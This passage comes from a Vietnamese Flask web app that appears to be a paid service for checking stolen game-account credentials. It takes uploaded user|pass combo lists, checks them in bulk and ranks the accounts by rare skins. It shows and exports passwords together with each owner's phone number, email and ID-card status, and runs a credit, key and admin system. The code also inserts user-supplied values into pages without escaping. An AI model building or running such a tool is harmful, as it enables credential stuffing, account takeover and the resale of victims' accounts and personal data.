            if len(job["logs"]) > 30: job["logs"] = job["logs"][-30:]
            if completed_count[0] % 5 == 0: save_data()
        return r

    with ThreadPoolExecutor(max_workers=MAX_CONCURRENT_CHECKS) as ex:
        futures = [ex.submit(process_one, pair) for pair in acc_list]
        for f in as_completed(futures):
            if job.get("cancelled"):
                for fut in futures: fut.cancel()
                break
    sss_c = sum(1 for r in results if r["type"] == "sss")
    ss_c = sum(1 for r in results if r["type"] == "ss")
    an_c = sum(1 for r in results if r["type"] == "anime")
    ban_c = sum(1 for r in results if r["type"] == "banned")
    norm_c = sum(1 for r in results if r["type"] == "normal")
    trang_c = sum(1 for r in results if r["type"] == "trang")
    fail_c = sum(1 for r in results if r["type"] == "failed")
    user["mission"]["total_acc"] = user["mission"].get("total_acc", 0) + len(results)
    user["mission"]["sss"] = user["mission"].get("sss", 0) + sss_c
    user["mission"]["ss"] = user["mission"].get("ss", 0) + ss_c
    user["mission"]["anime"] = user["mission"].get("anime", 0) + an_c
    add_exp(user, len(results))
    if job.get("cancelled"):
        not_checked = total - len(results)
        refund = (not_checked + 44) // 45
        if refund > 0:
            user["balance"] += refund
            job["refunded"] = refund
    if user.get("current_job") == job_id: user["current_job"] = None
    save_data(force=True)
    job["done"] = True
    job["stats"] = {"total": len(results), "sss": sss_c, "ss": ss_c, "anime": an_c,
                    "banned": ban_c, "normal": norm_c, "trang": trang_c, "failed": fail_c}
    job["progress"] = 100
    job["summary"] = (f"◈ HOÀN TẤT!\n├─ Đã check: {len(results)}/{total}\n"
                      f"├─ SSS: {sss_c}\n├─ SS: {ss_c}\n├─ Anime: {an_c}\n"
                      f"├─ Trắng TT: {trang_c}\n├─ Trắng thường: {norm_c}\n"
                      f"├─ Ban: {ban_c}\n└─ Trượt: {fail_c}")
    def cleanup():
        time.sleep(600); CHECK_JOBS.pop(job_id, None)
    threading.Thread(target=cleanup, daemon=True).start()

# ========== LỌC FILE ==========
@app.route("/loc_file")
@login_required
def loc_file():
    user = get_user()
    content = '''<div class="card">
        <h2 class="card-title">📥 Lọc File Acc</h2>
        <p style="color:var(--text-dim); margin-bottom:14px; font-size:0.9em;">
            Upload file .txt bất kỳ — <span class="filter-badge">🤖 LỌC 25+ ĐỊNH DẠNG</span></p>
        <form method="POST" action="/loc_file/process" enctype="multipart/form-data">
            <div class="form-group"><label class="form-label">File danh sách (.txt)</label>
                <input type="file" name="file" class="form-input" accept=".txt" required></div>
            <button type="submit" class="btn btn-block">📥 Lọc File Này</button>
        </form>
    </div>'''
    return render_page(content, active_tab="loc_file", user=user)

@app.route("/loc_file/process", methods=["POST"])
@login_required
def loc_file_process():
    user = get_user()
    if "file" not in request.files:
        flash("Chưa chọn file!", "error"); return redirect(url_for("loc_file"))
    f = request.files["file"]
    if not f.filename.endswith(".txt"):
        flash("Chỉ nhận file .txt!", "error"); return redirect(url_for("loc_file"))
    content_bytes = f.read().decode("utf-8", errors="ignore")
    accs = parse_file_content_advanced(content_bytes, "auto")
    if not accs:
        flash("Không tìm thấy acc hợp lệ!", "error"); return redirect(url_for("loc_file"))
    total = len(accs)
    session["loc_accs"] = accs[:1000]
    session.permanent = True
    rows = ""
    for i, (u, p) in enumerate(accs[:200], 1):
        rows += f'<div class="list-item"><div style="flex:1; min-width:0;"><div style="font-family:monospace; font-weight:600;">{i}. <b style="color:#00f0ff;">{u}</b> : <b style="color:#ff88ee;">{p}</b></div></div></div>'
    content = f'''
    <div class="card">
        <h2 class="card-title" style="color:#00ff88;">✓ Lọc thành công!</h2>
        <div class="stat-grid"><div class="stat-box"><div class="stat-value">{total}</div><div class="stat-label">Acc hợp lệ</div></div></div>
    </div>
    <div class="card">
        <h2 class="card-title">📥 Tải File Đã Lọc</h2>
        <div style="display:flex; flex-direction:column; gap:10px;">
            <a href="/loc_file/download?fmt=pipe" class="btn btn-block" style="background:linear-gradient(135deg,#00ff88,#00d4aa); color:#000;">📥 user|pass</a>
            <a href="/loc_file/download?fmt=stt" class="btn btn-block" style="background:linear-gradient(135deg,#00f0ff,#00a5ff); color:#000;">📥 1|user|pass</a>
            <a href="/loc_file/download?fmt=colon" class="btn btn-block" style="background:linear-gradient(135deg,#ffb800,#ff8800); color:#000;">📥 user:pass</a>
        </div>
    </div>
    <div class="card"><h2 class="card-title">📋 Danh Sách ({total})</h2>{rows}</div>
    <a href="/loc_file" class="btn btn-secondary btn-block">← Lọc File Khác</a>'''
    return render_page(content, active_tab="loc_file", user=user)

@app.route("/loc_file/download")
@login_required
def loc_file_download():
    fmt = request.args.get("fmt", "pipe")
    accs = session.get("loc_accs", [])
    if not accs:
        flash("Không có dữ liệu!", "error"); return redirect(url_for("loc_file"))
    lines = []
    if fmt == "stt":
        for i, (u, p) in enumerate(accs, 1): lines.append(f"{i}|{u}|{p}")
        fname = "loc_acc_stt.txt"
    elif fmt == "colon":
        for u, p in accs: lines.append(f"{u}:{p}")
        fname = "loc_acc_colon.txt"
    else:
        for u, p in accs: lines.append(f"{u}|{p}")
        fname = "loc_acc_pipe.txt"
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    return Response("\n".join(lines).encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename={fname.replace('.txt','')}_{ts}.txt"})

@app.route("/export_tool")
@login_required
def export_tool():
    user = get_user()
    content = '''<div class="card"><h2 class="card-title">📄 Tạo File Danh Sách</h2>
        <form method="POST" action="/export_tool/download">
        <div class="form-group"><label class="form-label">Danh sách acc</label>
            <textarea name="accs" class="form-textarea" rows="15" required style="min-height:300px;" placeholder="user1|pass1&#10;user2:pass2"></textarea></div>
        <div class="form-group"><label class="form-label">Tên file</label>
            <input type="text" name="filename" class="form-input" value="danh_sach_acc"></div>
        <button type="submit" class="btn btn-block">📥 Xuất File .txt</button></form></div>'''
    return render_page(content, active_tab="export", user=user)

@app.route("/export_tool/download", methods=["POST"])
@login_required
def export_tool_download():
    raw = request.form.get("accs", "").strip()
    filename = request.form.get("filename", "danh_sach_acc").strip()
    safe = "".join(c for c in filename if c.isalnum() or c in "_-") or "danh_sach_acc"
    if not raw: flash("Chưa nhập!", "error"); return redirect(url_for("export_tool"))
    accs = parse_file_content_advanced(raw, "auto")
    if not accs: flash("Không có acc hợp lệ!", "error"); return redirect(url_for("export_tool"))
    return Response("\n".join([f"{u}|{p}" for u, p in accs]).encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename={safe}.txt"})

# ========== LỊCH SỬ ==========
@app.route("/history")
@login_required
def history():
    user = get_user()
    tab = request.args.get("tab", "all")
    hist = user.get("history", [])[::-1]
    filters = {"sss": lambda h: h.get("result") == "sss", "ss": lambda h: h.get("result") == "ss",
               "anime": lambda h: h.get("result") == "anime", "trang": lambda h: h.get("result") == "trang",
               "vip": lambda h: h.get("result") in ("sss","ss","anime")}
    filtered = [h for h in hist if filters.get(tab, lambda h: True)(h)] if tab in filters else hist
    counts = {"all": len(hist),
        "sss": sum(1 for h in hist if h.get("result") == "sss"),
        "ss": sum(1 for h in hist if h.get("result") == "ss"),
        "anime": sum(1 for h in hist if h.get("result") == "anime"),
        "trang": sum(1 for h in hist if h.get("result") == "trang")}
    counts["vip"] = counts["sss"] + counts["ss"] + counts["anime"]
    export_btn = ""
    if tab == "vip": export_btn = f'<a href="/export_vip_all" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 XUẤT VIP ALL - {counts["vip"]} acc</a>'
    elif tab in ("sss","ss","anime","trang"): export_btn = f'<a href="/export_results?type={tab}" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 Xuất File {tab.upper()}</a>'
    elif tab == "all": export_btn = '<a href="/export_vip_all" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 Xuất Tất Cả VIP</a>'
    rows = ""
    if filtered:
        for h in filtered[:200]:
            color = {"sss": "#ffb800", "ss": "#00f0ff", "anime": "#e040fb", "normal": "#8b8b9a",
                     "trang": "#a0a0b8", "banned": "#ff2951", "failed": "#5a5a6e"}.get(h.get("result", ""), "#8b8b9a")
            hid = h.get("id", "")
            kho_badge = '<span class="kho-badge">🎁 KHO</span>' if h.get("from_kho") else ""
            rows += f'''<div class="list-item">
                <div style="flex:1; min-width:0;"><div style="font-family:monospace; font-weight:600; overflow:hidden; text-overflow:ellipsis;">{h['acc']}{kho_badge}</div>
                <div style="font-size:0.72em; color:var(--text-mute);">{h['time']} · {h.get("total_skins", 0)} skin · {h.get('rank','') or 'Chưa xếp hạng'}</div></div>
                <div style="padding:4px 12px; background:{color}20; color:{color}; border-radius:8px; font-size:0.72em; font-weight:800; text-transform:uppercase;">{h['result']}</div>
                <a href="/history/{hid}" class="btn btn-sm btn-info">👁</a>
            </div>'''
    else: rows = '<p style="text-align:center; color:var(--text-dim); padding:20px;">Chưa có dữ liệu</p>'
    content = f'''
    <div class="card"><h2 class="card-title">▤ Lịch Sử Check</h2></div>
    <div class="tab-bar">
        <a href="/history?tab=all" class="tab-item {'active' if tab == 'all' else ''}">▤ Tất Cả ({counts['all']})</a>
        <a href="/history?tab=vip" class="tab-item {'active' if tab == 'vip' else ''}">★ VIP ({counts['vip']})</a>
        <a href="/history?tab=sss" class="tab-item sss-tab {'active' if tab == 'sss' else ''}">◈ SSS ({counts['sss']})</a>
        <a href="/history?tab=ss" class="tab-item ss-tab {'active' if tab == 'ss' else ''}">◆ SS ({counts['ss']})</a>
        <a href="/history?tab=anime" class="tab-item anime-tab {'active' if tab == 'anime' else ''}">◇ Anime ({counts['anime']})</a>
        <a href="/history?tab=trang" class="tab-item trang-tab {'active' if tab == 'trang' else ''}">○ Trắng ({counts['trang']})</a>
    </div>
    {export_btn}
    <div class="card">{rows}</div>'''
    return render_page(content, active_tab="history", user=user)

@app.route("/history/<hid>")
@login_required
def history_detail(hid):
    user = get_user()
    entry = None
    for h in user.get("history", []):
        if h.get("id") == hid: entry = h; break
    if not entry: flash("Không tìm thấy!", "error"); return redirect(url_for("history"))
    if request.args.get("del") == "1":
        user["history"] = [x for x in user["history"] if x.get("id") != hid]
        save_data(force=True)
        flash("Đã xóa khỏi lịch sử!", "success")
        return redirect(url_for("history"))
    t = entry.get("result", "unknown")
    tier_colors = {"sss": ("#ffb800","◈","SSS"), "ss": ("#00f0ff","◆","SS"),
                   "anime": ("#e040fb","◇","ANIME"), "normal": ("#8b8b9a","▪","THƯỜNG"),
                   "trang": ("#a0a0b8","○","TRẮNG"), "banned": ("#ff2951","✖","BANNED"),
                   "failed": ("#5a5a6e","✕","LỖI")}
    color, icon, tier_label = tier_colors.get(t, ("#8b8b9a","?",t.upper()))
    cred_box = f'''<div class="cred-box"><div class="cred-label">◈ Tài khoản</div>
        <div class="cred-value" onclick="copyText(this)">{entry.get('acc','')}</div>
        <div class="cred-label">◈ Mật khẩu</div>
        <div class="cred-value" onclick="copyText(this)">{entry.get('password','')}</div>
        <button class="btn btn-success btn-block" onclick="copyBoth('{entry.get('acc','')}','{entry.get('password','')}')" style="margin-top:8px;">📋 Copy cả TK + MK</button>
    </div>'''
    def render_skin_grid(lst, cls, ico, label):
        if not lst: return ""
        items_html = ""
        for s in lst:
            items_html += f'''<div class="skin-card">
                <div class="skin-img-wrap">
                    <img src="{s.get('cdn','')}" alt="" loading="lazy" onerror="this.onerror=null;this.src='{s.get('cdn_fallback','')}';">
                </div>
                <div class="skin-info">
                    <div class="skin-hero">{s.get('hero','?')}</div>
                    <div class="skin-name">{s.get('skin','?')}</div>
                    <div class="skin-id">#{s.get('id','')}</div>
                </div></div>'''
        return f'<div class="card"><h3 class="card-title" style="font-size:0.95em;">{ico} {label} ({len(lst)})</h3><div class="skin-grid">{items_html}</div></div>'
    sss_html = render_skin_grid(entry.get("skins_sss", []), "sss", "⭐", "SSS")
    anime_html = render_skin_grid(entry.get("skins_anime", []), "anime", "🎴", "ANIME")
    ss_html = render_skin_grid(entry.get("skins_ss", []), "ss", "💠", "SS")
    kho_banner = '<div class="kho-badge" style="font-size:0.85em; padding:6px 14px; margin-bottom:10px;">🎁 NHẬN TỪ KHO ACC</div>' if entry.get("from_kho") else ""
    banner = f'''<div class="card" style="text-align:center; border:2px solid {color};">
        {kho_banner}
        <div style="font-size:4em; color:{color};">{icon}</div>
        <div style="font-family:Orbitron; font-size:1.8em; font-weight:900; color:{color};">{tier_label}</div>
        <div style="font-size:0.75em; color:var(--text-mute); margin-top:8px;">{entry["time"]}</div></div>'''
    banned_text = f'<span style="color:#ff2951; font-weight:700;">🔴 BANNED</span>' if entry.get("banned") else '<span style="color:#00ff88; font-weight:700;">🟢 CLEAN</span>'
    phone_disp = entry.get("mobile_no") or "Không có"
    if entry.get("mobile_no") and entry.get("country_code"):
        phone_disp = f"{entry['mobile_no']} (+{entry['country_code']})"
    info_card = f'''<div class="card"><h3 class="card-title">◐ Thông Tin</h3>
        <div class="info-row"><span class="info-label">UID</span><span class="info-value">{entry.get("uid") or "N/A"}</span></div>
        <div class="info-row"><span class="info-label">Player UID</span><span class="info-value">{entry.get("player_uid") or "N/A"}</span></div>
        <div class="info-row"><span class="info-label">Nickname</span><span class="info-value">{entry.get("nickname") or entry.get("nick") or "Chưa đặt"}</span></div>
        <div class="info-row"><span class="info-label">SĐT</span><span class="info-value">{phone_disp}</span></div>
        <div class="info-row"><span class="info-label">Email</span><span class="info-value">{entry.get("email") or "Không có"}</span></div>
        <div class="info-row"><span class="info-label">CMND</span><span class="info-value">{entry.get("idcard") or "Chưa liên kết"}</span></div>
        <div class="info-row"><span class="info-label">2FA</span><span class="info-value">{"BẬT" if entry.get("two_fa") else "TẮT"}</span></div>
        <div class="info-row"><span class="info-label">Rank</span><span class="info-value">{entry.get("rank") or "Chưa xếp hạng"} ({entry.get("rank_stars",0)}★)</span></div>
        <div class="info-row"><span class="info-label">Level</span><span class="info-value">{entry.get("level", 0)}</span></div>
        <div class="info-row"><span class="info-label">Sò</span><span class="info-value">{entry.get("shell", 0)}</span></div>
        <div class="info-row"><span class="info-label">Trạng thái</span><span class="info-value">{banned_text}</span></div>
        <div class="info-row"><span class="info-label">Tổng Skin</span><span class="info-value">{entry.get("total_skins",0)}</span></div></div>'''
    content = f'''
    <div style="margin-bottom:14px; display:flex; gap:8px;">
        <a href="/history" class="btn btn-secondary btn-sm">← Quay Lại</a>
        <a href="/history/{hid}?del=1" class="btn btn-danger btn-sm" onclick="return confirm('Xóa khỏi lịch sử?');">🗑️ Xóa</a>
    </div>
    {banner}{cred_box}{info_card}{sss_html}{anime_html}{ss_html}
    <script>
    function copyBoth(u, p) {{
        var text = "User: " + u + "\\nPass: " + p;
        if (navigator.clipboard) {{
            navigator.clipboard.writeText(text).then(function() {{ showToast("✓ Đã copy TK + MK!"); }});
        }}
    }}
    </script>'''
    return render_page(content, active_tab="history", user=user)

def build_export_lines(items, header_title, user):
    lines = ["#" + "="*60, f"# {header_title}", "#" + "="*60,
             f"# Người xuất: {user['username']}",
             f"# Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             f"# Tổng: {len(items)} acc", "#" + "="*60 + "\n"]
    for idx, h in enumerate(sorted(items, key=lambda x: x.get("time",""), reverse=True), 1):
        tier = h.get("result","").upper()
        sss_c = len(h.get("skins_sss", [])); ss_c = len(h.get("skins_ss", []))
        anime_c = len(h.get("skins_anime", [])); other_c = len(h.get("skins_other", []))
        total = sss_c + ss_c + anime_c + other_c
        lines += ["#" + "─"*60, f"# [{idx}] ACC {tier}",
            f"# UID: {h.get('uid','N/A')} | Nick: {h.get('nick','N/A') or 'Chưa đặt'}",
            f"# Rank: {h.get('rank','N/A')} ({h.get('rank_stars',0)}★) | Level: {h.get('level',0)}",
            f"# SĐT: {h.get('mobile_no','') or 'Không có'} | Email: {h.get('email','') or 'Không có'}",
            f"# Tổng Skin: {total}", f"# Acc: {h.get('acc','')}|{h.get('password','')}"]
        if sss_c:
            lines.append(f"# ⭐ SSS ({sss_c}):")
            for s in h.get("skins_sss", []): lines.append(f"#   ⭐ {s.get('hero','?')} → {s.get('skin','?')}")
        if anime_c:
            lines.append(f"# 🎴 Anime ({anime_c}):")
            for s in h.get("skins_anime", []): lines.append(f"#   🎴 {s.get('hero','?')} → {s.get('skin','?')}")
        if ss_c:
            lines.append(f"# 💎 SS ({ss_c}):")
            for s in h.get("skins_ss", []): lines.append(f"#   💎 {s.get('hero','?')} → {s.get('skin','?')}")
        lines += ["", f"{h.get('acc','')}|{h.get('password','')}", ""]
    return "\n".join(lines)

@app.route("/export_vip_all")
@login_required
def export_vip_all():
    user = get_user()
    hist = user.get("history", [])
    all_vip = [h for h in hist if h.get("result") in ("sss","ss","anime")]
    if not all_vip: flash("Chưa có acc VIP!", "error"); return redirect(url_for("history"))
    file_content = build_export_lines(all_vip, "DANH SÁCH ACC VIP", user)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    return Response(file_content.encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename=acc_VIP_ALL_{ts}.txt"})

@app.route("/export_results")
@login_required
def export_results():
    user = get_user()
    t = request.args.get("type", "sss")
    hist = user.get("history", [])
    items = [h for h in hist if h.get("result") == t]
    if not items: flash(f"Chưa có acc {t.upper()}!", "error"); return redirect(url_for("history"))
    file_content = build_export_lines(items, f"DANH SÁCH ACC {t.upper()}", user)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    return Response(file_content.encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename=acc_{t.upper()}_{ts}.txt"})

# ========== SHARE ==========
@app.route("/share/create/<hid>")
@login_required
def share_create(hid):
    user = get_user()
    entry = None
    for h in user.get("history", []):
        if h.get("id") == hid: entry = h; break
    if not entry: flash("Không tìm thấy!", "error"); return redirect(url_for("history"))
    share_id = uuid.uuid4().hex[:12]
    SHARES[share_id] = {
        "id": share_id, "owner": user["username"],
        "acc": entry.get("acc", ""), "password": "***",
        "uid": entry.get("uid", ""), "nick": entry.get("nick", ""),
        "rank": entry.get("rank", ""), "rank_stars": entry.get("rank_stars", 0),
        "level": entry.get("level", 0), "total_skins": entry.get("total_skins", 0),
        "result": entry.get("result", ""),
        "skins_sss": entry.get("skins_sss", []),
        "skins_ss": entry.get("skins_ss", []),
        "skins_anime": entry.get("skins_anime", []),
        "skins_other": entry.get("skins_other", []),
        "created": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "timestamp": time.time(),
    }
    save_data(force=True)
    flash(f"Link share: /s/{share_id}", "success")
    return redirect(url_for("share_view", sid=share_id))

@app.route("/s/<sid>")
def share_view(sid):
    share = SHARES.get(sid)
    if not share:
        return render_page('<div class="card"><h2>Link không tồn tại!</h2></div>', user=None)
    sss = share.get("skins_sss", []); ss = share.get("skins_ss", []); anime = share.get("skins_anime", [])
    def render_grid(lst, cls, ico, label):
        if not lst: return ""
        items = ""
        for s in lst:
            items += f'''<div class="skin-card">
                <div class="skin-img-wrap"><img src="{s.get('cdn','')}" loading="lazy" onerror="this.onerror=null;this.src='{s.get('cdn_fallback','')}';"></div>
                <div class="skin-info"><div class="skin-hero">{s.get('hero','?')}</div><div class="skin-name">{s.get('skin','?')}</div></div>
            </div>'''
        return f'<div class="card"><h3 class="card-title">{ico} {label} ({len(lst)})</h3><div class="skin-grid">{items}</div></div>'
    content = f'''<div class="card" style="text-align:center;">
        <h2 class="card-title" style="justify-content:center;">ACC {share.get("result","").upper()}</h2>
        <div class="info-row"><span class="info-label">UID</span><span class="info-value">{share.get("uid","N/A")}</span></div>
        <div class="info-row"><span class="info-label">Nick</span><span class="info-value">{share.get("nick","N/A")}</span></div>
        <div class="info-row"><span class="info-label">Rank</span><span class="info-value">{share.get("rank","")} ({share.get("rank_stars",0)}★)</span></div>
    </div>
    {render_grid(sss, "sss", "⭐", "SSS")}{render_grid(anime, "anime", "🎴", "ANIME")}{render_grid(ss, "ss", "💠", "SS")}'''
    return render_page(content, user=None)

# ========== ADMIN PANEL ==========
@app.route("/admin")
@admin_or_qtv_required
def admin_panel():
    user = get_user()
    tab = request.args.get("tab", "stats")
    if is_qtv(user["username"]) and not is_owner(user["username"]):
        if tab in ("users", "keys", "logs"):
            flash("QTV không có quyền xem mục này!", "error")
            return redirect(url_for("admin_panel"))
    body = ""
    if tab == "users":
        rows = ""
        for un, u in list(USERS.items())[:200]:
            banned_mark = "🚫" if un in BANNED_USERS else ""
            ban_btn = f'<a href="/admin/unban/{un}" class="btn btn-sm btn-success">Unban</a>' if un in BANNED_USERS else f'<a href="/admin/ban/{un}" class="btn btn-sm btn-danger">Ban</a>'
            rows += f'''<div class="list-item" style="flex-wrap:wrap;">
                <div style="flex:1; min-width:120px;">{un} {banned_mark} {"🥇" if u.get("is_owner") else ""} {"👑QTV" if u.get("is_qtv") else ""}</div>
                <div style="display:flex; gap:4px; align-items:center; flex-wrap:wrap;">
                    <form method="POST" action="/admin/add_balance" style="display:flex; gap:4px; align-items:center;">
                        <input type="hidden" name="username" value="{un}">
                        <input type="number" name="amount" placeholder="+/-" class="form-input" style="width:70px; padding:4px;">
                        <select name="mode" class="form-input" style="width:90px; padding:4px; font-size:0.75em;">
                            <option value="permanent">Vĩnh viễn</option>
                            <option value="daily">Theo ngày</option>
                        </select>
                        <button type="submit" class="btn btn-sm">+</button>
                    </form>
                    {ban_btn}
                </div></div>'''
        body = f'<div class="card"><h3 class="card-title">◐ Users ({len(USERS)})</h3>{rows}</div>'
    elif tab == "keys":
        rows = ""
        for k, v in GENERATED_KEYS.items():
            rows += f'''<div class="list-item"><div><div style="font-family:monospace; color:#00f0ff;">{k}</div>
                <div style="font-size:0.72em;">còn {v["remaining_uses"]} · +{v["check_count"]}</div></div>
                <form method="POST" action="/admin/delete_key" style="margin:0;">
                <input type="hidden" name="key" value="{k}"><button type="submit" class="btn btn-sm btn-danger">✕</button></form></div>'''
        body = f'''<div class="card"><h3 class="card-title">◆ Tạo Key</h3>
            <form method="POST" action="/admin/create_key">
                <div class="form-group"><label class="form-label">Tên key</label><input type="text" name="name" class="form-input" required></div>
                <div class="form-group"><label class="form-label">Lượt check</label><input type="number" name="check_count" class="form-input" required min="1"></div>
                <div class="form-group"><label class="form-label">Số lần nhập</label><input type="number" name="uses" class="form-input" required min="1"></div>
                <button type="submit" class="btn btn-block">Tạo Key</button>
            </form></div>
            <div class="card"><h3 class="card-title">◈ Keys ({len(GENERATED_KEYS)})</h3>{rows or "Chưa có"}</div>'''
    elif tab == "notif":
        body = '''<div class="card"><h3 class="card-title">◉ Gửi Thông Báo</h3>
            <form method="POST" action="/admin/send_notification">
                <div class="form-group"><label class="form-label">Tiêu đề</label><input type="text" name="title" class="form-input" required></div>
                <div class="form-group"><label class="form-label">Nội dung</label><textarea name="content" class="form-textarea" required></textarea></div>
                <button type="submit" class="btn btn-warning btn-block">Gửi</button>
            </form></div>'''
    elif tab == "logs":
        rows = ""
        for l in ADMIN_LOGS[-100:][::-1]:
            rows += f'<div class="info-row"><span class="info-label">{l["time"]} · {l["admin"]}</span><span class="info-value">{l["action"]} {l["target"]}</span></div>'
        body = f'<div class="card"><h3 class="card-title">📝 Admin Logs</h3>{rows or "Chưa có"}</div>'
    else:
        body = f'''<div class="card"><h2 class="card-title">◈ Thống Kê</h2>
            <div class="stat-grid"><div class="stat-box"><div class="stat-value">{len(USERS)}</div><div class="stat-label">Users</div></div>
            <div class="stat-box"><div class="stat-value">{len(ACC_STORAGE)}</div><div class="stat-label">Kho Acc</div></div>
            <div class="stat-box"><div class="stat-value">{len(GENERATED_KEYS)}</div><div class="stat-label">Keys</div></div>
            <div class="stat-box"><div class="stat-value">{len(BANNED_USERS)}</div><div class="stat-label">Banned</div></div></div></div>'''
    is_own = is_owner(user["username"])
    content = f'''<div class="tab-bar">
        <a href="/admin" class="tab-item {'active' if tab=='stats' else ''}">◈ Stats</a>
        {"" if not is_own else '<a href="/admin?tab=users" class="tab-item ' + ('active' if tab=='users' else '') + '">◐ Users</a>'}
        {"" if not is_own else '<a href="/admin?tab=keys" class="tab-item ' + ('active' if tab=='keys' else '') + '">◆ Keys</a>'}
        <a href="/admin?tab=notif" class="tab-item {'active' if tab=='notif' else ''}">◉ T.Báo</a>
        {"" if not is_own else '<a href="/admin?tab=logs" class="tab-item ' + ('active' if tab=='logs' else '') + '">📝 Logs</a>'}
    </div>{body}'''
    return render_page(content, active_tab="", user=user)

@app.route("/admin/create_key", methods=["POST"])
@owner_required
def admin_create_key():
    name = request.form.get("name", "").strip().upper()
    try: cc = int(request.form.get("check_count", 0)); us = int(request.form.get("uses", 0))
    except: flash("Số không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="keys"))
    if not name or cc <= 0 or us <= 0:
        flash("Dữ liệu không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="keys"))
    key = name
    if key in GENERATED_KEYS: key = f"{name}_{int(time.time())}"
    GENERATED_KEYS[key] = {"name": name, "remaining_uses": us, "check_count": cc,
                            "created_by": session["username"], "created_at": time.time()}
    log_admin("CREATE_KEY", key, f"+{cc} x {us}")
    save_data(force=True)
    flash(f"Đã tạo: {key}", "success")
    return redirect(url_for("admin_panel", tab="keys"))

@app.route("/admin/delete_key", methods=["POST"])
@owner_required
def admin_delete_key():
    k = request.form.get("key", "")
    if k in GENERATED_KEYS:
        del GENERATED_KEYS[k]; log_admin("DELETE_KEY", k); save_data(force=True)
        flash("Đã xóa", "success")
    return redirect(url_for("admin_panel", tab="keys"))

@app.route("/admin/add_balance", methods=["POST"])
@owner_required
def admin_add_balance():
    un = request.form.get("username", "")
    mode = request.form.get("mode", "permanent")
    try: amt = int(request.form.get("amount", 0))
    except: flash("Số không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="users"))
    if un in USERS:
        if mode == "daily":
            today = datetime.now().strftime("%Y-%m-%d")
            daily_bonus = USERS[un].setdefault("daily_bonus", {})
            if daily_bonus.get("date") != today:
                daily_bonus.clear()
                daily_bonus["date"] = today
                daily_bonus["amount"] = 0
            daily_bonus["amount"] = daily_bonus.get("amount", 0) + amt
            log_admin("ADD_BALANCE_DAILY", un, f"+{amt} xu (hôm nay)")
            flash(f"+{amt} xu (theo ngày) cho {un}", "success")
        else:
            USERS[un]["balance"] = USERS[un].get("balance", 0) + amt
            log_admin("ADD_BALANCE_PERM", un, f"+{amt} xu (vĩnh viễn)")
            flash(f"+{amt} xu (vĩnh viễn) cho {un}", "success")
        save_data(force=True)
    return redirect(url_for("admin_panel", tab="users"))

@app.route("/admin/ban/<username>")
@owner_required
def admin_ban(username):
    if username == OWNER_USERNAME: flash("Không ban Owner!", "error")
    else:
        BANNED_USERS.add(username)
        log_admin("BAN", username)
        save_data(force=True)
        flash(f"Đã ban {username}", "success")
    return redirect(url_for("admin_panel", tab="users"))

@app.route("/admin/unban/<username>")
@owner_required
def admin_unban(username):
    BANNED_USERS.discard(username)
    log_admin("UNBAN", username)
    save_data(force=True)
    flash(f"Đã unban {username}", "success")
    return redirect(url_for("admin_panel", tab="users"))

@app.route("/admin/send_notification", methods=["POST"])
@admin_or_qtv_required
def admin_send_notification():
    t = request.form.get("title", "").strip(); c = request.form.get("content", "").strip()
    if not t or not c: flash("Nhập đầy đủ!", "error"); return redirect(url_for("admin_panel", tab="notif"))
    NOTIFICATIONS.append({"id": uuid.uuid4().hex[:10], "title": t, "content": c,
                          "admin": session["username"],
                          "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                          "timestamp": time.time()})
    if len(NOTIFICATIONS) > 200: NOTIFICATIONS.pop(0)
    log_admin("SEND_NOTIF", t)
    save_data(force=True)
    flash(f"Đã gửi: {t}", "success")
    return redirect(url_for("admin_panel", tab="notif"))

@app.route("/notifications")
@login_required
def notifications():
    user = get_user()
    mark_read()
    items = ""
    for n in reversed(NOTIFICATIONS):
        items += f'<div class="card"><div style="font-weight:700;">{n["title"]}</div><div style="font-size:0.72em; color:var(--text-mute);">{n["time"]} · {n["admin"]}</div><div style="white-space:pre-wrap; margin-top:8px;">{n["content"]}</div></div>'
    if not items: items = '<div class="card"><p style="text-align:center;">Chưa có thông báo</p></div>'
    return render_page(f'<div class="card"><h2 class="card-title">◉ Thông Báo</h2></div>{items}', active_tab="notif", user=user)

# ========== PROFILE ==========
@app.route("/profile")
@login_required
def profile():
    user = get_user()
    last_ci = user.get("last_checkin", 0); now = time.time()
    can_checkin = now - last_ci >= 86400
    ci_status = "Có thể điểm danh" if can_checkin else f"Còn {int(86400 - (now - last_ci)) // 3600}h"
    hist = user.get("history", [])
    counts = {"sss": sum(1 for h in hist if h.get("result") == "sss"),
              "ss": sum(1 for h in hist if h.get("result") == "ss"),
              "anime": sum(1 for h in hist if h.get("result") == "anime"),
              "trang": sum(1 for h in hist if h.get("result") in ("trang","normal"))}
    role_badge, role_color = get_role_badge(user["username"])
    daily_limit = user.get("daily_limit", USER_DAILY_LIMIT)
    limit_disp = "∞" if daily_limit == -1 else str(daily_limit)
    content = f'''
    <div class="card"><h2 class="card-title">◐ Thông Tin</h2>
        <div class="info-row"><span class="info-label">Role</span><span class="info-value" style="color:{role_color}; font-weight:800;">{role_badge}</span></div>
        <div class="info-row"><span class="info-label">Username</span><span class="info-value">{user['username']}</span></div>
        <div class="info-row"><span class="info-label">🏷️ Tag</span><span class="info-value" style="font-family:monospace;">{user.get('tag_code','Không có')}</span></div>
        <div class="info-row"><span class="info-label">ID</span><span class="info-value" style="font-family:monospace;">{user['id']}</span></div>
        <div class="info-row"><span class="info-label">Số dư</span><span class="info-value">{user.get('balance', 0)} xu</span></div>
        <div class="info-row"><span class="info-label">🎁 Lượt nhận acc</span><span class="info-value" style="color:#00ff88; font-weight:800;">{limit_disp}/ngày</span></div>
